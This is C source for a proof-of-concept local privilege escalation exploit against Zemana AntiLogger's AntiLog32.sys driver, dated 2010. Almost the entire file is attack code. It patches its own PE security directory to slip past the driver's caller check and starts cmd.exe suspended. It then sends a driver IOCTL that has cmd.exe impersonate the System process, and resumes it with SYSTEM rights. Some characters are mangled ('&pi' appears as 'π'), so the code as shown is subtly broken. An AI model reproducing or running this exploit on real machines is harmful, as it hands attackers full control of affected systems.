#include "stdafx.h"
#include "windows.h"
#include "winioctl.h"
#define IOCTL_IMPERSONATE_PROCESS CTL_CODE(0x8000 , 0x807 , METHOD_BUFFERED , FILE_ANY_ACCESS)
 
typedef struct _IMPERSONATE_PROCESS{
    HANDLE ImpersonateProcess ;
    HANDLE SystemProcess ;
}IMPERSONATE_PROCESS , *PIMPERSONATE_PROCESS;
 
int main(int argc, char* argv[])
{
    printf("Zemana AntiLogger <=1.9.2.2.206 AntiLog32.sys <= 1.5.2.755\n"
        "Local Privilege Escalation Vulnerability Proof-of-Concept\n"
        "2010-7-28\n"
        "By MJ0011 th_decoder@126.com\n\nPress Enter\n");
    getchar();
     
    //bypass some useless create check
 
    PIMAGE_DOS_HEADER pdoshdr = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
    PIMAGE_NT_HEADERS pnthdr = (PIMAGE_NT_HEADERS)((ULONG)pdoshdr + pdoshdr->e_lfanew);
    PVOID waddr = &pnthdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress ;
     
    ULONG oldp ;
 
    VirtualProtect(waddr , sizeof(ULONG) , PAGE_READWRITE , &oldp);
    pnthdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0x1 ;
    VirtualProtect(waddr , sizeof(ULONG) , oldp , &oldp);
 
 
    HANDLE hdev = CreateFile("\\\\.\\AntiLog32" ,
        FILE_READ_ATTRIBUTES ,
        FILE_SHARE_READ ,
        0,
        OPEN_EXISTING ,
        0,0);
 
    if (hdev == INVALID_HANDLE_VALUE)
    {
        printf("cannot open device %u\n" , GetLastError());
        getchar();
        return 0;
 
    }
 
    STARTUPINFOA sia ;
    memset(&sia , 0 , sizeof(sia));
    sia.cb = sizeof(sia);
    PROCESS_INFORMATION pi ;
    memset(π , 0 , sizeof(pi));
 
     
 
    if (!CreateProcess("c:\\windows\\system32\\cmd.exe" ,
        NULL ,
        NULL,
        NULL,
        FALSE ,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &sia ,
        π))
    {
        printf("cannot run cmd.exe....%u\n", GetLastError());
        getchar();
        return 0 ;
    }
 
     
    IMPERSONATE_PROCESS ip ;
    ip.ImpersonateProcess = (HANDLE)pi.dwProcessId ;
    ip.SystemProcess = (HANDLE)4 ; //// WinXP and later
    ULONG btr ;
 
    if (!DeviceIoControl(hdev , IOCTL_IMPERSONATE_PROCESS , &ip , sizeof(ip) , NULL , 0 , &btr, 0))
    {
        printf("cannot impersonate process %u\n" , GetLastError());
        getchar();
        return 0 ;
    }
 
    ResumeThread(pi.hThread);
 
    printf("OK\n");
 
     
    return 0;
}
